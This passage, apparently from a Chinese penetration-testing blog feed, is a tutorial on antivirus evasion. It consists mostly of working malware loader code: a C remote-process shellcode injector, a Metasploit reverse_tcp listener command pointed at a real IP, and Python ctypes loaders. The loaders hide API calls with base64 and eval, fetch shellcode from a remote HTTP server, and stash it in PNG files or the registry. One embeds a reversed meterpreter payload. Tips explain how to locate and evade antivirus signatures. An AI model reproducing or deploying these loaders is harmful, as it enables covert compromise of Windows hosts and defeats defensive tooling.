class="line">    &#125;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;shellcode loding~&quot;</span>);</span><br><span class="line">    <span class="comment">//开始注入进程</span></span><br><span class="line">    Handle = <span class="built_in">OpenProcess</span>(PROCESS_ALL_ACCESS, FALSE, Pid);</span><br><span class="line">    remoteBuffer = <span class="built_in">VirtualAllocEx</span>(Handle, <span class="literal">NULL</span>, <span class="built_in">sizeof</span>(ShellCode), (MEM_RESERVE | MEM_COMMIT), PAGE_EXECUTE_READWRITE);</span><br><span class="line">    <span class="built_in">WriteProcessMemory</span>(Handle, remoteBuffer, ShellCode, <span class="built_in">sizeof</span>(ShellCode), <span class="literal">NULL</span>);</span><br><span class="line">    remoteThread = <span class="built_in">CreateRemoteThread</span>(Handle, <span class="literal">NULL</span>, <span class="number">0</span>, (LPTHREAD_START_ROUTINE)remoteBuffer, <span class="literal">NULL</span>, <span class="number">0</span>, <span class="literal">NULL</span>);</span><br><span class="line">    <span class="built_in">CloseHandle</span>(Handle);</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">(<span class="type">int</span> argc, <span class="type">char</span> *argv[])</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="type">char</span> *p;</span><br><span class="line">    <span class="type">int</span> pid;</span><br><span class="line">    errno = <span class="number">0</span>;</span><br><span class="line">    <span class="type">long</span> conv = <span class="built_in">strtol</span>(argv[<span class="number">1</span>], &amp;p, <span class="number">10</span>);</span><br><span class="line">    <span class="comment">// 检查错误：例如，输入的是字符串而不是整数，或者输入的整数超过int范围</span></span><br><span class="line">    <span class="keyword">if</span> (errno != <span class="number">0</span> || *p != <span class="string">&#x27;\0&#x27;</span> || conv &gt; INT_MAX || conv &lt; INT_MIN) &#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        pid = conv;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;%d\n&quot;</span>, pid);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">InjectShellCode</span>(pid);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><figure class="highlight powershell"><table><tr><td class="code"><pre><span class="line"><span class="comment">#注入进行，上线</span></span><br><span class="line">InjectXor.exe pid</span><br><span class="line">InjectXor.exe <span class="number">18040</span></span><br><span class="line"><span class="comment">#开启监听</span></span><br><span class="line">handler <span class="literal">-p</span> windows/x64/meterpreter/reverse_tcp <span class="literal">-H</span> <span class="number">124.223</span>.<span class="number">217.243</span> <span class="literal">-P</span> <span class="number">4321</span></span><br></pre></td></tr></table></figure><h1 id="Python加载Shellcode（学完-python-再来看）"><a href="#Python加载Shellcode（学完-python-再来看）" class="headerlink" title="Python加载Shellcode（学完 python 再来看）"></a>Python加载Shellcode（学完 python 再来看）</h1><h2 id="pyinstaller-打包-python-代码为-exe"><a href="#pyinstaller-打包-python-代码为-exe" class="headerlink" title="pyinstaller 打包 python 代码为 exe"></a>pyinstaller 打包 python 代码为 exe</h2><p>执行 python 的代码需要有 python 环境，但是呢，我们可以直接打包可执行程序～～～这样限制就少了一点</p><ol><li>安装 pyinstaller</li></ol><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">pip3 install pyinstaller</span><br></pre></td></tr></table></figure><ol start="2"><li>打包 python 代码</li></ol><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">pyinstaller.exe -F -w .\sc.py</span><br></pre></td></tr></table></figure><h2 id="shellcodeLoder-Python（上节学过）"><a href="#shellcodeLoder-Python（上节学过）" class="headerlink" title="shellcodeLoder-Python（上节学过）"></a>shellcodeLoder-Python（上节学过）</h2><blockquote><p>这种简单的shellcode很容易被秒杀，可以逐行代码测试哪里有问题，再想办法绕过修改</p></blockquote><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> base64</span><br><span class="line"><span class="keyword">import</span> codecs</span><br><span class="line"><span class="keyword">import</span> ctypes<span class="comment">#主要用到此库</span></span><br><span class="line">shellcode = <span class="built_in">bytearray</span>(<span class="string">&quot;shellcode&quot;</span>)</span><br><span class="line">ctypes.windll.kernel32.VirtualAlloc.restype = ctypes.c_uint64</span><br><span class="line"><span class="comment"># 1. 通过 VirtualAlloc 申请内存区域</span></span><br><span class="line">ptr = ctypes.windll.kernel32.VirtualAlloc(ctypes.c_int(<span class="number">0</span>), </span><br><span class="line">ctypes.c_int(<span class="built_in">len</span>(shellcode)), ctypes.c_int(<span class="number">0x3000</span>), ctypes.c_int(<span class="number">0x40</span>))</span><br><span class="line"><span class="comment"># 2. 通过 RtlMoveMemory 把shellcode复制到申请的内存中</span></span><br><span class="line">buf = (ctypes.c_char * <span class="built_in">len</span>(shellcode)).from_buffer(shellcode)</span><br><span class="line"></span><br><span class="line"><span class="comment">#结果测试，该函数部分的代码，被杀软标记，瞬间就被查杀，后面有解救方法，下面注释的两行代码可以解决ctypes.windll.kernel32.RtlMoveMemory部分被查杀的结局</span></span><br><span class="line"><span class="comment">#rtm = b&quot;Y3R5cGVzLndpbmRsbC5rZXJuZWwzMi5SdGxNb3ZlTWVtb3J5KGN0eXBlcy5jX3VpbnQ2NChwdHIpLCBidWYsIGN0eXBlcy5jX2ludChsZW4oc2hlbGxjb2RlKSkp&quot;</span></span><br><span class="line"><span class="comment">#eval(str(base64.b64decode(rtm),&#x27;utf-8&#x27;))</span></span><br><span class="line">ctypes.windll.kernel32.RtlMoveMemory(</span><br><span class="line"> ctypes.c_uint64(ptr), </span><br><span class="line"> buf, </span><br><span class="line"> ctypes.c_int(<span class="built_in">len</span>(shellcode))</span><br><span class="line">)</span><br><span class="line"><span class="comment"># 3. 通过 CreateThread 创建线程执行shellcode</span></span><br><span class="line">handle = ctypes.windll.kernel32.CreateThread(</span><br><span class="line">    ctypes.c_int(<span class="number">0</span>),</span><br><span class="line">    ctypes.c_int(<span class="number">0</span>),</span><br><span class="line">    ctypes.c_uint64(ptr),</span><br><span class="line">    ctypes.c_int(<span class="number">0</span>),</span><br><span class="line">    ctypes.c_int(<span class="number">0</span>),</span><br><span class="line">    ctypes.pointer(ctypes.c_int(<span class="number">0</span>))</span><br><span class="line">)</span><br><span class="line"><span class="comment"># 4. 通过  WaitForSingleObject 检测线程对象的状态，为了让线程一直处于运行状态</span></span><br><span class="line">ctypes.windll.kernel32.WaitForSingleObject(ctypes.c_int(handle),ctypes.c_int(-<span class="number">1</span>)</span><br><span class="line">)</span><br><span class="line"></span><br></pre></td></tr></table></figure><h2 id="base-loader-py"><a href="#base-loader-py" class="headerlink" title="base_loader.py"></a>base_loader.py</h2><blockquote><p>以参数形式传入shellcode的好处就是不会被检测到，实际上就是一个分离免杀</p></blockquote><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># coding: utf-8</span></span><br><span class="line"><span class="keyword">import</span> ctypes</span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"><span class="keyword">import</span> base64</span><br><span class="line"><span class="comment">#以参数形式，传入16进制的shellcode，记得去掉\x</span></span><br><span class="line">shellcode = <span class="built_in">bytearray</span>(<span class="built_in">bytes</span>.fromhex(sys.argv[<span class="number">1</span>]))</span><br><span class="line">ctypes.windll.kernel32.VirtualAlloc.restype = ctypes.c_uint64</span><br><span class="line">ptr = ctypes.windll.kernel32.VirtualAlloc(ctypes.c_int(<span class="number">0</span>), ctypes.c_int(<span class="built_in">len</span>(shellcode)), types.c_int(<span class="number">0x3000</span>), ctypes.c_int(<span class="number">0x40</span>))</span><br><span class="line">buf = (ctypes.c_char * <span class="built_in">len</span>(shellcode)).from_buffer(shellcode)</span><br><span class="line">ctypes.windll.kernel32.RtlMoveMemory(</span><br><span class="line">    ctypes.c_uint64(ptr), </span><br><span class="line">    buf, </span><br><span class="line">    ctypes.c_int(<span class="built_in">len</span>(shellcode))</span><br><span class="line">)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 3. 通过 CreateThread 创建线程执行shellcode</span></span><br><span class="line">handle = ctypes.windll.kernel32.CreateThread(</span><br><span class="line">    ctypes.c_int(<span class="number">0</span>), </span><br><span class="line">    ctypes.c_int(<span class="number">0</span>), </span><br><span class="line">    ctypes.c_uint64(ptr), </span><br><span class="line">    ctypes.c_int(<span class="number">0</span>), </span><br><span class="line">    ctypes.c_int(<span class="number">0</span>), </span><br><span class="line">    ctypes.pointer(ctypes.c_int(<span class="number">0</span>))</span><br><span class="line">)</span><br><span class="line"><span class="comment"># handle = ctypes.windll.kernel32.CreateThread(ctypes.c_int(0), ctypes.c_int(0), ctypes.c_uint64(ptr), ctypes.c_int(0), ctypes.c_int(0), ctypes.pointer(ctypes.c_int(0)))</span></span><br><span class="line">ctypes.windll.kernel32.WaitForSingleObject(ctypes.c_int</span><br><span class="line">(handle),ctypes.c_int(-<span class="number">1</span>))</span><br></pre></td></tr></table></figure><p>上线</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">base_loader.exe 16进制数据</span><br></pre></td></tr></table></figure><p><img src="https://alvin-note.oss-cn-hangzhou.aliyuncs.com/Markdown/202209200216479.png" alt="image-20220920021629195"></p><h2 id="loader-ms-py"><a href="#loader-ms-py" class="headerlink" title="loader_ms.py"></a>loader_ms.py</h2><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># coding: utf-8</span></span><br><span class="line"><span class="keyword">import</span> ctypes</span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"><span class="keyword">import</span> base64</span><br><span class="line">shellcode = <span class="built_in">bytearray</span>(<span class="built_in">bytes</span>.fromhex(sys.argv[<span class="number">1</span>]))</span><br><span class="line">ctypes.windll.kernel32.VirtualAlloc.restype = ctypes.c_uint64</span><br><span class="line">ptr = ctypes.windll.kernel32.VirtualAlloc(ctypes.c_int(<span class="number">0</span>), ctypes.c_int(<span class="built_in">len</span>(shellcode)), ctypes.c_int(<span class="number">0x3000</span>), ctypes.c_int(<span class="number">0x40</span>))</span><br><span class="line">buf = (ctypes.c_char * <span class="built_in">len</span>(shellcode)).from_buffer(shellcode)</span><br><span class="line">rtm = <span class="string">b&quot;Y3R5cGVzLndpbmRsbC5rZXJuZWwzMi5SdGxNb3ZlTWVtb3J5KGN0eXBlcy5jX3VpbnQ2NChwdHIpLCBidWYsIGN0eXBlcy5jX2ludChsZW4oc2hlbGxjb2RlKSkp&quot;</span></span><br><span class="line"><span class="built_in">eval</span>(<span class="built_in">str</span>(base64.b64decode(rtm),<span class="string">&#x27;utf-8&#x27;</span>))</span><br><span class="line">ct = <span class="string">b&quot;Y3R5cGVzLndpbmRsbC5rZXJuZWwzMi5DcmVhdGVUaHJlYWQoY3R5cGVzLmNfaW50KDApLCBjdHlwZXMuY19pbnQoMCksIGN0eXBlcy5jX3VpbnQ2NChwdHIpLCBjdHlwZXMuY19pbnQoMCksIGN0eXBlcy5jX2ludCgwKSwgY3R5cGVzLnBvaW50ZXIoY3R5cGVzLmNfaW50KDApKSk=&quot;</span></span><br><span class="line">handle = <span class="built_in">eval</span>(<span class="built_in">str</span>(base64.b64decode(ct), <span class="string">&#x27;utf-8&#x27;</span>))</span><br><span class="line">ctypes.windll.kernel32.WaitForSingleObject(ctypes.c_int(handle),ctypes.c_int(-<span class="number">1</span>))</span><br></pre></td></tr></table></figure><h2 id="loader-b64-py"><a href="#loader-b64-py" class="headerlink" title="loader_b64.py"></a>loader_b64.py</h2><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> base64</span><br><span class="line"><span class="keyword">import</span> codecs</span><br><span class="line"><span class="keyword">import</span> ctypes</span><br><span class="line"><span class="comment"># base64编码shellcode \xfc\x48\x83\xe4\xf0......\xa2\x56\xff\xd5</span></span><br><span class="line">shellcode = <span class="string">&quot;XHhmY1......ZmZceGQ1&quot;</span></span><br><span class="line"><span class="comment">#运行时解码shellcode</span></span><br><span class="line">shellcode = base64.b64decode(shellcode)</span><br><span class="line"><span class="comment">#转化为字节类型</span></span><br><span class="line">shellcode = codecs.escape_decode(shellcode)[<span class="number">0</span>]</span><br><span class="line">shellcode = <span class="built_in">bytearray</span>(shellcode)</span><br><span class="line"><span class="comment"># shellcode = bytearray(codecs.escape_decode(base64.b64decode(shellcode))[0])</span></span><br><span class="line">ctypes.windll.kernel32.VirtualAlloc.restype = ctypes.c_uint64</span><br><span class="line"></span><br><span class="line"><span class="comment"># 1. 通过 VirtualAlloc 申请内存区域</span></span><br><span class="line">ptr = ctypes.windll.kernel32.VirtualAlloc(ctypes.c_int(<span class="number">0</span>), ctypes.c_int(<span class="built_in">len</span>(shellcode)), ctypes.c_int(<span class="number">0x3000</span>), ctypes.c_int(<span class="number">0x40</span>))</span><br><span class="line"><span class="comment"># 2. 通过 RtlMoveMemory 把shellcode复制到申请的内存中</span></span><br><span class="line">buf = (ctypes.c_char * <span class="built_in">len</span>(shellcode)).from_buffer(shellcode)</span><br><span class="line"><span class="comment">#原函数是：ctypes.windll.kernel32.RtlMoveMemory(ctypes.c_uint64(ptr),buf, ctypes.c_int(len(shellcode)))</span></span><br><span class="line"><span class="comment">#base编码后就是rtm后面双引号之中的内容</span></span><br><span class="line">rtm = <span class="string">b&quot;Y3R5cGVzLndpbmRsbC5rZXJuZWwzMi5SdGxNb3ZlTWVtb3J5KGN0eXBlcy5jX3VpbnQ2NChwdHIpLCBidWYsIGN0eXBlcy5jX2ludChsZW4oc2hlbGxjb2RlKSkp&quot;</span></span><br><span class="line"><span class="comment">#解码为字符串，再通过eval函数执行字符串</span></span><br><span class="line"><span class="built_in">eval</span>(<span class="built_in">str</span>(base64.b64decode(rtm),<span class="string">&#x27;utf-8&#x27;</span>))</span><br><span class="line"><span class="comment"># 3. 通过 CreateThread 创建线程执行shellcode</span></span><br><span class="line">ct = <span class="string">b&quot;Y3R5cGVzLndpbmRsbC5rZXJuZWwzMi5DcmVhdGVUaHJlYWQoY3R5cGVzLmNfaW50KDApLCBjdHlwZXMuY19pbnQoMCksIGN0eXBlcy5jX3VpbnQ2NChwdHIpLCBjdHlwZXMuY19pbnQoMCksIGN0eXBlcy5jX2ludCgwKSwgY3R5cGVzLnBvaW50ZXIoY3R5cGVzLmNfaW50KDApKSk=&quot;</span></span><br><span class="line">handle = <span class="built_in">eval</span>(<span class="built_in">str</span>(base64.b64decode(ct), <span class="string">&#x27;utf-8&#x27;</span>))</span><br><span class="line"><span class="comment"># 4. 通过  WaitForSingleObject 检测线程对象的状态，为了让线程一直处于运行状态</span></span><br><span class="line">ctypes.windll.kernel32.WaitForSingleObject(ctypes.c_int(handle),ctypes.c_int(-<span class="number">1</span>))</span><br></pre></td></tr></table></figure><h2 id="loader-http-py"><a href="#loader-http-py" class="headerlink" title="loader_http.py"></a>loader_http.py</h2><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> base64</span><br><span class="line"><span class="keyword">import</span> codecs</span><br><span class="line"><span class="keyword">import</span> ctypes</span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="comment"># base64加密shellcode放在1.txt之中</span></span><br><span class="line"><span class="comment">#通过requert库下载远程的1.txt</span></span><br><span class="line">shell = requests.get(<span class="string">&#x27;http://ip:8000/1.txt&#x27;</span>)</span><br><span class="line"><span class="comment">#转换为字节数据</span></span><br><span class="line">shellcode = base64.b64decode(shell.text)</span><br><span class="line">shellcode = codecs.escape_decode(shellcode)[<span class="number">0</span>]</span><br><span class="line">shellcode = <span class="built_in">bytearray</span>(shellcode)</span><br><span class="line"><span class="comment"># shellcode = bytearray(codecs.escape_decode(base64.b64decode(shellcode))[0])</span></span><br><span class="line">ctypes.windll.kernel32.VirtualAlloc.restype = ctypes.c_uint64</span><br><span class="line">ptr = ctypes.windll.kernel32.VirtualAlloc(ctypes.c_int(<span class="number">0</span>), ctypes.c_int(<span class="built_in">len</span>(shellcode)), types.c_int(<span class="number">0x3000</span>), ctypes.c_int(<span class="number">0x40</span>))</span><br><span class="line">buf = (ctypes.c_char * <span class="built_in">len</span>(shellcode)).from_buffer(shellcode)</span><br><span class="line">rtm = <span class="string">b&quot;Y3R5cGVzLndpbmRsbC5rZXJuZWwzMi5SdGxNb3ZlTWVtb3J5KGN0eXBlcy5jX3VpbnQ2NChwdHIpLCBidWYsIGN0eXBlcy5jX2ludChsZW4oc2hlbGxjb2RlKSkp&quot;</span></span><br><span class="line"><span class="built_in">eval</span>(<span class="built_in">str</span>(base64.b64decode(rtm),<span class="string">&#x27;utf-8&#x27;</span>))</span><br><span class="line">ct = <span class="string">b&quot;Y3R5cGVzLndpbmRsbC5rZXJuZWwzMi5DcmVhdGVUaHJlYWQoY3R5cGVzLmNfaW50KDApLCBjdHlwZXMuY19pbnQoMCksIGN0eXBlcy5jX3VpbnQ2NChwdHIpLCBjdHlwZXMuY19pbnQoMCksIGN0eXBlcy5jX2ludCgwKSwgY3R5cGVzLnBvaW50ZXIoY3R5cGVzLmNfaW50KDApKSk=&quot;</span></span><br><span class="line">handle = <span class="built_in">eval</span>(<span class="built_in">str</span>(base64.b64decode(ct), <span class="string">&#x27;utf-8&#x27;</span>))</span><br><span class="line">ctypes.windll.kernel32.WaitForSingleObject(ctypes.c_int(handle),ctypes.c_int(-<span class="number">1</span>))</span><br></pre></td></tr></table></figure><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment">#远程主机启用http服务</span></span><br><span class="line">python3 -m http.server </span><br><span class="line"><span class="comment">#开启监听</span></span><br><span class="line">~</span><br></pre></td></tr></table></figure><h2 id="loader-png-py"><a href="#loader-png-py" class="headerlink" title="loader_png.py"></a>loader_png.py</h2><p>加载png中的shellcode，分离免杀</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> ctypes</span><br><span class="line"><span class="keyword">import</span> base64</span><br><span class="line"><span class="keyword">import</span> codecs</span><br><span class="line"><span class="comment"># 打开文件读取shellcode，并转换为字节类型</span></span><br><span class="line">shellf = <span class="built_in">open</span>(<span class="string">&quot;payload.png&quot;</span>, <span class="string">&quot;rb&quot;</span>)</span><br><span class="line">shellcode = shellf.read()</span><br><span class="line"><span class="comment">#转换为字节的类型</span></span><br><span class="line">shellcode = codecs.escape_decode(shellcode)[<span class="number">0</span>]</span><br><span class="line">shellcode = <span class="built_in">bytearray</span>(shellcode)</span><br><span class="line"><span class="comment"># 1. 通过 VirtualAlloc 申请内存区域</span></span><br><span class="line">ctypes.windll.kernel32.VirtualAlloc.restype = ctypes.c_uint64;</span><br><span class="line">ptr = ctypes.windll.kernel32.VirtualAlloc(ctypes.c_int(<span class="number">0</span>), ctypes.c_int(<span class="built_in">len</span>(shellcode)), types.c_int(<span class="number">0x3000</span>), ctypes.c_int(<span class="number">0x40</span>));</span><br><span class="line"><span class="comment"># 2. 通过 RtlMoveMemory 把shellcode复制到申请的内存中</span></span><br><span class="line">buf = (ctypes.c_char * <span class="built_in">len</span>(shellcode)).from_buffer(shellcode);</span><br><span class="line">ctypes.windll.kernel32.RtlMoveMemory( ctypes.c_uint64(ptr), buf, ctypes.c_int(<span class="built_in">len</span>(shellcode)) )</span><br><span class="line"><span class="comment"># 3. 通过 CreateThread 创建线程执行shellcode</span></span><br><span class="line">handle = ctypes.windll.kernel32.CreateThread(ctypes.c_int(<span class="number">0</span>), ctypes.c_int(<span class="number">0</span>), ctypes.c_uint64(ptr), ctypes.c_int(<span class="number">0</span>), ctypes.c_int(<span class="number">0</span>), ctypes.pointer(ctypes.c_int(<span class="number">0</span>)))</span><br><span class="line"><span class="comment"># 4. 通过  WaitForSingleObject 检测线程对象的状态，为了让线程一直处于运行状态</span></span><br><span class="line">ctypes.windll.kernel32.WaitForSingleObject(ctypes.c_int(handle),ctypes.c_int(-<span class="number">1</span>))</span><br></pre></td></tr></table></figure><h2 id="loader-regQueryValueEx-py"><a href="#loader-regQueryValueEx-py" class="headerlink" title="loader_regQueryValueEx.py"></a>loader_regQueryValueEx.py</h2><blockquote><p>注册表可以存储shellcode，再读取加载，这样就没有shellcode文件落地</p></blockquote><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> ctypes</span><br><span class="line"><span class="keyword">from</span> ctypes <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> ctypes.wintypes <span class="keyword">import</span> *</span><br><span class="line">buf = <span class="string">b&quot;\xfc\x48\x83\xe4\xf0&quot;</span></span><br><span class="line"><span class="comment"># 通过 ctypes 库调用 RegQueryValueExA 函数实现上线 cs</span></span><br><span class="line"><span class="comment"># RegSetValueExA 函数在Advapi32.dll库中，可以设置注册表项下指定值的数据和类型</span></span><br><span class="line"><span class="comment"># https://docs.microsoft.com/en-us/windows/win32/api/winreg/nf-winreg-regsetvalueexa</span></span><br><span class="line"><span class="comment"># LSTATUS RegSetValueExA(</span></span><br><span class="line"><span class="comment">#   HKEY       hKey, // 注册表HKLM_CURRWNT_USER -2147483647</span></span><br><span class="line"><span class="comment">#   LPCSTR     lpValueName, //注册表项中新建的值</span></span><br><span class="line"><span class="comment">#   DWORD      Reserved,</span></span><br><span class="line"><span class="comment">#   DWORD      dwType, // 值的类型，存储二进制，值类型为REG_BINARY python中为3</span></span><br><span class="line"><span class="comment">#   const BYTE *lpData, // 写入的数据，写入shellcode</span></span><br><span class="line"><span class="comment">#   DWORD      cbData  //数据大小</span></span><br><span class="line"><span class="comment"># );</span></span><br><span class="line"><span class="comment">#将shellcode写入注册表中，新建了一个test的注册表项</span></span><br><span class="line">ctypes.windll.Advapi32.RegSetValueExA(-<span class="number">2147483647</span>, <span class="string">&quot;test&quot;</span>, <span class="literal">None</span>, <span class="number">3</span>, buf, <span class="built_in">len</span>(buf))</span><br><span class="line"><span class="comment"># 根据需要的指针类型将内存改为LPBYTE的指针</span></span><br><span class="line">LPBYTE = POINTER(c_byte)</span><br><span class="line">ctypes.windll.kernel32.VirtualAlloc.restype = LPBYTE</span><br><span class="line">ptr = ctypes.windll.kernel32.VirtualAlloc(<span class="number">0</span>, <span class="number">800</span>, <span class="number">0x3000</span>, <span class="number">0x40</span>)</span><br><span class="line">data_len = DWORD()</span><br><span class="line"><span class="comment"># RegQueryValueExA 函数，用于检索与打开的注册表项关联的指定值名称的类型和数据</span></span><br><span class="line"><span class="comment"># https://docs.microsoft.com/en-us/windows/win32/api/winreg/nf-winreg-regqueryvalueexa</span></span><br><span class="line"><span class="comment"># LSTATUS RegQueryValueExA(</span></span><br><span class="line"><span class="comment">#   HKEY    hKey,</span></span><br><span class="line"><span class="comment">#   LPCSTR  lpValueName,</span></span><br><span class="line"><span class="comment">#   LPDWORD lpReserved,</span></span><br><span class="line"><span class="comment">#   LPDWORD lpType,</span></span><br><span class="line"><span class="comment">#   LPBYTE  lpData, // 接收查询到的shellcode</span></span><br><span class="line"><span class="comment">#   LPDWORD lpcbData  // shellcode长度，</span></span><br><span class="line"><span class="comment"># );</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 执行 RegQueryValueExA 来获取shellcode长度</span></span><br><span class="line">ctypes.windll.Advapi32.RegQueryValueExA(-<span class="number">2147483647</span>, <span class="string">&quot;test&quot;</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, byref(data_len))</span><br><span class="line"><span class="comment"># 执行 RegQueryValueExA 读shellcode到申请的内存</span></span><br><span class="line">ctypes.windll.Advapi32.RegQueryValueExA(-<span class="number">2147483647</span>, <span class="string">&quot;test&quot;</span>, <span class="number">0</span>, <span class="literal">None</span>, ptr, byref(data_len))</span><br><span class="line"><span class="comment"># 删除注册表中创建的值</span></span><br><span class="line">ctypes.windll.Advapi32.RegDeleteValueA(-<span class="number">2147483647</span>, <span class="string">&quot;test&quot;</span>)</span><br><span class="line"><span class="comment"># 创建线程执行 shellcode</span></span><br><span class="line">handle = ctypes.windll.kernel32.CreateThread(<span class="number">0</span>, <span class="number">0</span>, ptr, <span class="number">0</span>, <span class="number">0</span>, ctypes.pointer(ctypes.c_int(<span class="number">0</span>)))</span><br><span class="line">ctypes.windll.kernel32.WaitForSingleObject(handle, -<span class="number">1</span>)</span><br></pre></td></tr></table></figure><h2 id="loader-reverse-py"><a href="#loader-reverse-py" class="headerlink" title="loader_reverse.py"></a>loader_reverse.py</h2><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> base64</span><br><span class="line"><span class="keyword">import</span> ctypes</span><br><span class="line"><span class="keyword">import</span> codecs</span><br><span class="line"><span class="comment"># 此shellcode的值是反转后的值，从末尾开始读取</span></span><br><span class="line"><span class="comment"># msfvenom -p windows/x64/meterpreter/reverse_tcp_rc4 LHOST=xx.xx.xx.xx LPORT=4441 -f raw | xxd -ps</span></span><br><span class="line">shellcode = <span class="string">&#x27;5dff652a5b0f2c7c949500a6857eff14f5bd579cff841cff941103140141a8148141201400418814814168140041a81400c120140cefbd13843e570cef00418814814168140041a81461c120f02e082c988400c12014bd1384bf570cefaa8f98940c1384e580e38ebca701359c06350d2ae786a243000000018e6514951495f5ef98943b576c92843c1084ffffff029eecff945dff16d4e657ab1495755dff03f0f2b0ab14a500a6851400000400869575148582d7008f38024c38845dfff58c9d20ab149f9884ad98840f98949c13d4056535fd98940000100089d8845dff5e354a85ab149c13842f988485140000010086951404a600001000e9d8c43d2a500a6f186f98e5024c3884000000d6e8f0008f385dfff58c9d20ab149f9884851440a69c13d42e988401ce3884000010f18e5e57ecff94a0470c585dff16475a99ab149f98842e98c4851401a67c98845dff0efdf0aeab141c98840cff842c98840cff840c13d49c13d40505e514a0a65dff00b60892ab14950000101086ae98c45dff706277c4ab141f98c44e98944514adfad27795110020cb945e98940000100ace18846e9894651400002333f5233777eb94d5ffffffb49e21b884a59514850eff251402ce3884a51495148514a595e5851485140d10848840b8140d1094c104b84484c0b814660d10944204b844858d571d93548042c430c41f570e831c1014cad09c1c140c13846d10848843b8149cff849c13d4653e0d10940204b8448184b8050d108476470c58840000008808b80000002758f020b0818718660d1084c324b80225b884151425de2e1c1014d09c1c1402c220c716c3ca0c13849c13d4a4a47bf0840527b8840225b8848125b8840625b88456652d1384152505141514000000cc8e0f4e3884cf&#x27;</span></span><br><span class="line"><span class="comment">#使用字符串切片将shellcode反转</span></span><br><span class="line">shellcode = shellcode[::-<span class="number">1</span>] </span><br><span class="line"><span class="comment"># 设置VirtualAlloc返回类型为ctypes.c_uint64</span></span><br><span class="line">ctypes.windll.kernel32.VirtualAlloc.restype = ctypes.c_uint64</span><br><span class="line"><span class="comment"># 将shellcode转为16进制</span></span><br><span class="line">shellcode = <span class="built_in">bytes</span>().fromhex(shellcode)</span><br><span class="line"><span class="comment">#将转义字符去掉\ 并取0位</span></span><br><span class="line">shellcode = codecs.escape_decode(shellcode)[<span class="number">0</span>]</span><br><span class="line"><span class="comment">#将shellcode转为字节类型</span></span><br><span class="line">shellcode = <span class="built_in">bytearray</span>(shellcode)</span><br><span class="line"><span class="comment">#申请内存并设置该内存可读可写可执行</span></span><br><span class="line">ptr = ctypes.windll.kernel32.VirtualAlloc(ctypes.c_int(<span class="number">0</span>), ctypes.c_int(<span class="built_in">len</span>(shellcode)), ctypes.c_int(<span class="number">0x3000</span>), ctypes.c_int(<span class="number">0x40</span>))</span><br><span class="line"><span class="comment"># 调用RtlMoveMemory函数从指定内存中复制内容至另一内存</span></span><br><span class="line">buf = (ctypes.c_char * <span class="built_in">len</span>(shellcode)).from_buffer(shellcode)</span><br><span class="line">string = <span class="string">&#x27;&#x27;&#x27;Y3R5cGVzLndpbmRsbC5rZXJuZWwzMi5SdGxNb3ZlTWVtb3J5KA0KICAgIGN0eXBlcy5jX3VpbnQ2NChwdHIpLA0KICAgIGJ1ZiwNCiAgICBjdHlwZXMuY19pbnQobGVuKHNoZWxsY29kZSkpDQop&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="built_in">exec</span>(base64.b64decode(string))</span><br><span class="line"><span class="comment"># 创建一个线程从shellcode放置位置开始执行</span></span><br><span class="line">handle = ctypes.windll.kernel32.CreateThread(</span><br><span class="line">    ctypes.c_int(<span class="number">0</span>),</span><br><span class="line">    ctypes.c_int(<span class="number">0</span>),</span><br><span class="line">    ctypes.c_uint64(ptr),</span><br><span class="line">    ctypes.c_int(<span class="number">0</span>),</span><br><span class="line">    ctypes.c_int(<span class="number">0</span>),</span><br><span class="line">    ctypes.pointer(ctypes.c_int(<span class="number">0</span>))</span><br><span class="line">)</span><br><span class="line"><span class="comment"># 等待上面创建的线程运行完</span></span><br><span class="line">ctypes.windll.kernel32.WaitForSingleObject(ctypes.c_int(handle),ctypes.c_int(-<span class="number">1</span>))</span><br></pre></td></tr></table></figure><h1 id="技巧"><a href="#技巧" class="headerlink" title="技巧"></a>技巧</h1><h2 id="关于如何查找到“特征码”"><a href="#关于如何查找到“特征码”" class="headerlink" title="关于如何查找到“特征码”"></a>关于如何查找到“特征码”</h2><p>也就是如何判断我们是哪部分代码被杀软检测到了呢？？如何定位特征码</p><p>我们可以注释部分代码，再编译为可执行文件，上传测试免杀，逐行代码的排查被查杀的代码在哪里！！</p><h2 id="补充"><a href="#补充" class="headerlink" title="补充"></a>补充</h2><p>除了一些简单的静态查杀，有些杀软还会检测内存，检测监测系统敏感API，，监测用户敏感行为，恶意行为</p><p>还需要更加精进，保持进步</p>]]></content>
      
      
      <categories>
          
          <category> 渗透测试 </category>
          
          <category> 内网 </category>
          
          <category> 免杀 </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>常用免杀工具</title>
